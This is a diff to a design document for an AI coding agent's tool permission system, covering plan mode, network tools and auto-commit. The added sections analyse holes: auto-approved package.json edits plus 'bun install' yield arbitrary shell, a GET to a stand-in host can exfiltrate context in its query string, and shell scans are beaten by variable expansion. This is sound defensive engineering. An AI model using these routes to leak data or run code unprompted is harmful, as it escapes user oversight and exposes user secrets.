@@ -38,13 +38,15 @@ it, `resolveLikePi` must be revisited.
 
 Every new tool needs all four, or it is a hole:
 
-1. Registered — a `defineTool()` entry in `agent/version-tools.ts` (or Pi's
-   built-in set) **and** its name in `AGENT_TOOL_NAMES` in `agent/session.ts`.
+1. Registered — a `defineTool()` entry in `agent/version-tools.ts`,
+   `agent/web-tools.ts`, or Pi's built-in set, **and** its name in
+   `AGENT_TOOL_NAMES` in `agent/session.ts`.
    Pi's `tools` option is an allowlist; an unlisted custom tool is silently
    dropped.
-2. Classified in the permission gate (`FILE_TOOLS` or `VERSION_TOOLS`) so
-   `acceptEdits` treats it deliberately.
-3. Covered by `checkConfinement` if it takes a path or a command.
+2. Classified in the permission gate (`FILE_TOOLS`, `VERSION_TOOLS`,
+   `SUBPROCESS_TOOLS`, or `NETWORK_TOOLS`) so `acceptEdits` treats it
+   deliberately. `NETWORK_TOOLS` also grants `plan` access — see below.
+3. Covered by `checkConfinement` if it takes a path, a command, or a URL.
 4. Covered by `auto-commit.ts` if it writes to the filesystem.
 
 Also update the `## Available Tools` list in `agent/system-prompt.ts`, the label
@@ -53,14 +55,57 @@ maps in `ToolBubble.tsx`, and the summary switch in `InlineApproval.tsx`.
 An unclassified tool falls through to `{ behavior: 'ask' }`. That is the safe
 default — but a tool that reads or writes must be classified deliberately, not
 left to fall through. Never add a tool to the `acceptEdits` allow-list that can
-run arbitrary code; `bash` is deliberately absent.
+run arbitrary code; `bash` and `install_deps` are deliberately absent.
+
+**A fixed command is not enough to make a tool safe.** `install_deps` runs only
+`bun install` and takes no parameters, which reads as safe and is not: `bun`
+executes the project's own `preinstall`/`postinstall` scripts, and `acceptEdits`
+already lets the model write `package.json` without asking. Two auto-approved
+steps compose into unprompted arbitrary shell. Before auto-approving any tool
+that spawns a process, ask what that process reads from files the model can
+write.
 
 ## Permission Mode Enforcement
 
-`plan` mode is read-only and must stay that way — `checkPermission` denies every
-tool under `plan`, with no exceptions list. Denials are soft: the block reason
-becomes the tool result and the agent continues, so the model can explain itself
-rather than crashing.
+`plan` mode means **no side effects on the machine or the app**, and must stay
+that way. `checkPermission` denies every tool under `plan` with exactly one
+exception, `NETWORK_TOOLS`:
+
+- `web_fetch` issues a GET with no request body. It cannot write a file, run a
+  command, or modify the app, so it leaves the machine and the app as it found
+  them — which is what `plan` promises. Letting the agent read documentation
+  while planning is the point.
+
+**The exception is not "it only reads".** The model controls the whole URL, so a
+GET's path and query string are an egress channel: fetching
+`https://elsewhere.example/?p=<something from context>` exfiltrates as
+effectively as a POST would. With no host policy and no prompt in `plan` or
+`acceptEdits`, nothing stops that. It is an accepted residual risk, mitigated
+only by every call and its URL landing in the transcript where a person can see
+it. Never restate the exception as "`web_fetch` cannot send data anywhere" — that
+claim is false and must not be relied on as an invariant.
+
+That exception is sound **only while the tool stays GET-only**. Adding a `method`
+or `body` parameter to `web_fetch` invalidates the reasoning and must change
+`checkPermission` in the same commit. Do not add a second entry to
+`NETWORK_TOOLS` without the same analysis: "it only reads" is not enough, the
+test is whether the call can change anything anywhere.
+
+Denials are soft: the block reason becomes the tool result and the agent
+continues, so the model can explain itself rather than crashing.
+
+## Network Access Is Not Confined
+
+There is deliberately **no host policy**. `web_fetch` can reach `localhost`
+(including the Ollama daemon on 11434), the LAN, and link-local metadata
+addresses. `checkConfinement` validates only that the URL is well-formed
+`http(s)`; it is the hook a policy would use if one is ever wanted.
+
+`bash` reaches the network too, and always has — `curl` and `wget` were never in
+`BLOCKED_COMMANDS`, and `inspectCommand` only scans for filesystem paths.
+`describeNetworkUse` annotates such commands so the approval prompt can say why
+one matters, but it **refuses nothing** and is defeated by variable expansion
+like every other shell scan here. Do not describe it as a control.
 
 ## Writes Auto-Commit
 
@@ -71,6 +116,12 @@ is what makes every change rollback-able.
 - It is a `tool_result` hook, not a property of the tools, so a write that does
   not reach the hook is not committed. Keep the `COMMITTING_TOOLS` set in step
   with any tool that can modify files.
+- The hook keys on `input.path`, so a tool that writes files without a `path`
+  argument can never reach it. `install_deps` is the case in point: it takes no
+  parameters but `bun install` rewrites the lockfile, so it calls
+  `autoCommitInstallArtifacts` itself. A tool in that shape must commit its own
+  output, or `rollback` silently leaves that file behind — `git checkout` does
+  not remove uncommitted files.
 - A git failure must not lose the write, but it must be reported — the handler
   appends the failure to the tool result so the model and the user both see that
   the change is uncommitted.
